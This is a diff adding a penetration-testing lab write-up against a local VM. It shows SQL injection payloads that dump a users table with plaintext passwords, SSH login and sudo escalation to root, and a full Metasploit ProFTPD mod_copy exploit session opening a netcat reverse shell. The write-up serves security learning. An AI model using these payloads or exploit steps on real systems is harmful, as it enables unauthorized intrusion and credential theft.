@@ -75,4 +75,298 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 57.87 seconds
 ```
 
-## Attemp 1: 
+## sql injection and ssh
+
+sql injection to get user `leia_organa`'s password, then ssh to the machine and escalate to root.
+
+```sql
+1.  try if simple sql injection works on http://10.0.0.16/payroll_app.php
+' or 1=1 #
+
+2. it works, now try to get the table names
+' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables #
+
+obtains:
+...
+xonomy_term_data   
+taxonomy_term_hierarchy   
+taxonomy_vocabulary   
+url_alias   
+users   <- important!!
+users_roles   
+variable   
+watchdog   
+columns_priv
+...
+
+3. get column names from users table
+' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' #
+
+obtains:
+uid   
+name   
+pass   
+mail   
+theme   
+signature   
+signature_format   
+created   
+access   
+login   
+status   
+timezone   
+language   
+picture   
+init   
+data   
+username   <- important!!
+first_name   
+last_name   
+password   <- important!!
+salary
+
+
+4. get username and password from users table
+' UNION SELECT username, password, NULL, NULL FROM users #
+
+obtains:
+
+Username First Name Last Name Salary
+leia_organa help_me_obiwan  
+luke_skywalker like_my_father_beforeme  
+han_solo nerf_herder  
+artoo_detoo b00p_b33p  
+c_three_pio Pr0t0c07  
+ben_kenobi thats_no_m00n  
+darth_vader Dark_syD3  
+anakin_skywalker but_master:(  
+jarjar_binks mesah_p@ssw0rd  
+lando_calrissian @dm1n1str8r  
+boba_fett mandalorian1  
+jabba_hutt my_kinda_skum  
+greedo hanSh0tF1rst  
+chewbacca rwaaaaawr8  
+kylo_ren Daddy_Issues2
+```
+
+```bash
+(.venv) user@super:~/workspace/nycu-parallel-programing/HW6$ ssh leia_organa@10.0.0.16
+The authenticity of host '10.0.0.16 (10.0.0.16)' can't be established.
+ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.0.16' (ED25519) to the list of known hosts.
+leia_organa@10.0.0.16's password: 
+Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+leia_organa@SEC-NYCU-PMELin:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+leia_organa@SEC-NYCU-PMELin:~$ sudo su
+[sudo] password for leia_organa: 
+root@SEC-NYCU-PMELin:/home/leia_organa# whoami
+root
+```
+
+## Attemp 2: proftpd
+
+```
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf exploit(unix/ftp/proftpd_modcopy_exec) > option
+[-] Unknown command: option. Did you mean options? Run the help command for more details.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > options
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CHOST                       no        The local client address
+   CPORT                       no        The local client port
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
+                                         t][...]. Supported proxies: socks5, socks5h, sapni, h
+                                         ttp, socks4
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
+                                         ocs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 10.0.0.16
+RHOSTS => 10.0.0.16
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > options
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CHOST                       no        The local client address
+   CPORT                       no        The local client port
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
+                                          Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS     10.0.0.16        yes       The target host(s), see https://docs.metasploit.com/docs/usin
+                                         g-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /chat
+TARGETURI => /chat
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /drupal/
+TARGETURI => /drupal/
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /phpmyadmin/
+TARGETURI => /phpmyadmin/
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /
+TARGETURI => /
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > options
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CHOST                       no        The local client address
+   CPORT                       no        The local client port
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
+                                          Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS     10.0.0.16        yes       The target host(s), see https://docs.metasploit.com/docs/usin
+                                         g-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
+SITEPATH => /var/www/html
+msf exploit(unix/ftp/proftpd_modcopy_exec) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
+[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
+[*] 10.0.0.16:80 - Executing PHP payload /9N41B.php
+[+] 10.0.0.16:80 - Deleted /var/www/html/9N41B.php
+[*] Command shell session 3 opened (10.0.0.102:4444 -> 10.0.0.16:34782) at 2025-12-09 15:40:40 +0800
+msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions ls
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  3         shell cmd/unix               10.0.0.102:4444 -> 10.0.0.16:34782 (10.0.0.16)
+
+msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 3
+[*] Starting interaction with 3...
+
+whoami
+www-data
+```
